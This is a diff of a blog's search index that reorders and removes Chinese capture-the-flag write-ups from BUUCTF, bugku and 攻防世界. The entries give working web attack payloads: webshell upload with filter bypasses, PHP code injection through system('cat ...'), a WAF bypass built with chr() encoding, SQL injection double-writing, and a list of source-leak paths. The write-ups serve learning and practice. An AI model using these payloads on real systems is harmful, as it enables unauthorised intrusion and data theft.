@@ -1,70 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BUUCTF刷题日志2</title>
-    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
-    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
-<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
-<p>添加一个gif的文件头进去，绕过这个判断</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
-<p>上传成功</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
-<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
-<p>成功在根目录找到flag</p>
-<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
-<p>在根目录找到flag</p>
-<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
-<p>有前端验证</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
-<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
-<p>写不来了，看了别人的wp，</p>
-<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
-<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
-<p><code>? num=print_r(scandir(chr(47)));</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
-<p>发现flag，然后就访问这个flag</p>
-<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
-<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
-<p>但是可以双写绕过select和union</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
-<p>爆出列数有三个</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
-<p>然后又是枯燥的爆表爆字段</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
-<p>人嘛了，information里面的or都被过滤了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
-<p>反正一步一步爆，然后就出来了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
-<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
-<p>发现备份文件,又是代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
-<p>所以我们直接传值key=123</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
-<p>得到flag</p>
-<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
-<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
-<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
-<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
-<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
-<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
     <title>BUUCTF 的一些签到题 内有sql 命令执行(内联)</title>
     <url>/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/</url>
     <content><![CDATA[<h1 id="BUUCTF-的一些签到题-内有sql-命令执行"><a href="#BUUCTF-的一些签到题-内有sql-命令执行" class="headerlink" title="BUUCTF 的一些签到题 内有sql 命令执行"></a>BUUCTF 的一些签到题 内有sql 命令执行</h1><h2 id="第一题-easy-sql"><a href="#第一题-easy-sql" class="headerlink" title="第一题 easy sql"></a>第一题 easy sql</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110256458.png" alt="image-20220115110256458"></p>
@@ -186,6 +122,70 @@
 <h2 id="第十一题-菜刀"><a href="#第十一题-菜刀" class="headerlink" title="第十一题 菜刀"></a>第十一题 菜刀</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160821181.png" alt="image-20220115160821181"></p>
 <p>蚁剑直接连</p>
 <p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160834862.png" alt="image-20220115160834862"></p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>BUUCTF刷题日志2</title>
+    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
+    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
+<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
+<p>添加一个gif的文件头进去，绕过这个判断</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
+<p>上传成功</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
+<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
+<p>成功在根目录找到flag</p>
+<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
+<p>在根目录找到flag</p>
+<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
+<p>有前端验证</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
+<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
+<p>写不来了，看了别人的wp，</p>
+<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
+<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
+<p><code>? num=print_r(scandir(chr(47)));</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
+<p>发现flag，然后就访问这个flag</p>
+<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
+<p>但是可以双写绕过select和union</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
+<p>爆出列数有三个</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
+<p>然后又是枯燥的爆表爆字段</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
+<p>人嘛了，information里面的or都被过滤了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
+<p>反正一步一步爆，然后就出来了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
+<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
+<p>发现备份文件,又是代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
+<p>所以我们直接传值key=123</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
+<p>得到flag</p>
+<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
+<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
+<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
+<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
+<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
+<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>-Experience</category>
@@ -355,6 +355,22 @@
       </categories>
   </entry>
   <entry>
+    <title>bugku做题心得 备份是个好习惯</title>
+    <url>/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
+    <content><![CDATA[<h4 id="bugku做题心得-备份是个好习惯"><a href="#bugku做题心得-备份是个好习惯" class="headerlink" title="bugku做题心得 备份是个好习惯"></a>bugku做题心得 备份是个好习惯</h4><p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20211108160122664.png" alt="image-20211108160122664"></p>
+<p>函数拓展</p>
+<p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
+<p>函数格式：string ini_set(string $varname, string $newvalue) </p>
+<p>strstr函数</p>
+<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160329851.png" alt="image-20211108160329851"></p>
+<p>关于函数str_replace的绕过</p>
+<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160933783.png" alt="image-20211108160933783"></p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
     <title>bugku—source  用 kali Linux 里面的工具下载git源码</title>
     <url>/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/</url>
     <content><![CDATA[<h1 id="bugku—source-用-kali-Linux-里面的工具下载git源码"><a href="#bugku—source-用-kali-Linux-里面的工具下载git源码" class="headerlink" title="bugku—source  用 kali Linux 里面的工具下载git源码"></a>bugku—source  用 kali Linux 里面的工具下载git源码</h1><p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104190602170.png" alt="image-20220104190602170"></p>
@@ -376,22 +392,6 @@
 <p>然后用git show （加开头黄色那坨字符串）去一个一个查看</p>
 <p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191454285.png" alt="image-20220104191454285"></p>
 <p>发现flag</p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>bugku做题心得 备份是个好习惯</title>
-    <url>/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
-    <content><![CDATA[<h4 id="bugku做题心得-备份是个好习惯"><a href="#bugku做题心得-备份是个好习惯" class="headerlink" title="bugku做题心得 备份是个好习惯"></a>bugku做题心得 备份是个好习惯</h4><p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20211108160122664.png" alt="image-20211108160122664"></p>
-<p>函数拓展</p>
-<p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
-<p>函数格式：string ini_set(string $varname, string $newvalue) </p>
-<p>strstr函数</p>
-<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160329851.png" alt="image-20211108160329851"></p>
-<p>关于函数str_replace的绕过</p>
-<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160933783.png" alt="image-20211108160933783"></p>
 ]]></content>
       <categories>
         <category>-Experience</category>
@@ -2593,46 +2593,6 @@
       </categories>
   </entry>
   <entry>
-    <title>攻防世界 mfw git泄露</title>
-    <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
-    <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092755185.png" alt="image-20220102092755185"></p>
-<p>点进去在about页面发现git关键词，访问.git目录</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092836849.png" alt="image-20220102092836849"></p>
-<p>存在泄露</p>
-<p>用githack把源码下载下来</p>
-<p>下载下来后发现一个flag.php</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093430458.png" alt="image-20220102093430458"></p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093531927.png" alt="image-20220102093531927"></p>
-<p>再看看其他的php</p>
-<p>在index.php中有这样一段php</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093735231.png" alt="image-20220102093735231"></p>
-<p>asserter()函数可以吧字符串当成php执行，这page又没有过滤，然后就想到用system来读取flag</p>
-<p>先试一下吧strpos给注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=%27).phpinfo();//</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100454145.png" alt="image-20220102100454145"></p>
-<p>芜湖！</p>
-<p>最后用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=&#x27;).system(cat templates/flag.php);//</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100753784.png" alt="image-20220102100753784"></p>
-<p>要打开源码才看得见</p>
-<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102102441825.png" alt="image-20220102102441825"></p>
-<p>然后又看到了另一种方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?page=abc&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>
-
-<p>$file =templates/ abc’) or system(“cat templates/flag.php”);// “.php”<br> 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用” // “将后面的语句注释掉</p>
-<p><a href="https://www.cnblogs.com/xhds/p/12255609.html">PHP代码执行漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p>
-<p>其他泄露：<br>.svn源码泄露：当可以访问到/.svn/entries的时候，就证明存在。<br>DS_Store 文件泄露：当访问/.ds_store可以访问的到，就证明存在。<br>.hg 源码泄露：当访问/.hg存在的时候，就证明存在该漏洞。<br>常见编辑器备份文件泄露：<br>http://[ip]/.test.php.swp<br>http://[ip]/test.php.bak<br>http://[ip]/test.jsp.old<br>http://[ip]/cgi~<br>http://[ip]/index.php~</p>
-<p>or用法补充</p>
-<p>经常看到这样的语句：<br>file=fopen(file=fopen(filename, ‘r’) or die(“抱歉，无法打开: filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。<br>就这样。</p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
     <title>攻防世界 Confusion1 ssti漏洞系统讲解</title>
     <url>/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/</url>
